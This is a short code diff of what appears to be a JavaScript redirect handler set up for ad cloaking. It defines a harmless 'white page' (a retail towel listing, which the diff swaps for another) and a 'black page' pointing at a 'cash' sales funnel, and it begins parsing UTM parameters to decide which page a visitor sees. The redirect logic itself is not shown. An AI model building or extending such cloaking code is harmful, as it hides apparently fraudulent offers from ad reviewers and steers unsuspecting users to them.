@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.biglots.com/product/wild-sage-lattice-texture-bath-towel/svc1260004?N=580118039&skuId=svc1260004";
+    const whitePageURL = "https://www.athome.com/honeybloom-plush-performance-solid-blue-hand-towel-16x28/124344974.html";
     const blackPageURL = "https://VXAJXfDwZd.myfunnelish.com/cash-1735686017557538";
   
     // Parse the UTM parameters from the request URL
